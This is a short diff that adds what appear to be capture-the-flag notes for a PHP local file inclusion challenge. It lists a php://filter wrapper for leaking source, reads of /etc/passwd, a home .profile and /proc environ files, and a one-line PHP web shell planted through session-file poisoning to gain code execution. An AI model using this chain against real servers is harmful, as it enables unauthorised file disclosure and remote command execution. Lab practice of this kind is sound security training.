@@ -1,0 +1,11 @@
+
+1. view-source, thohshoosiephein4ro3chai2Epohdie.txt
+2. php://filter/bzip2.compress/convert.base64-encode/resource=index.php
+3. /etc/passwd
+4. /home/EeWu3f3e/.profile
+5. get /proc/*/environ || rce first
+6. uname: '<?php system($_GET['c']); ?>', /var/php/sess_PHPSESSID
+
+## Gotchas
+
+- no RFI
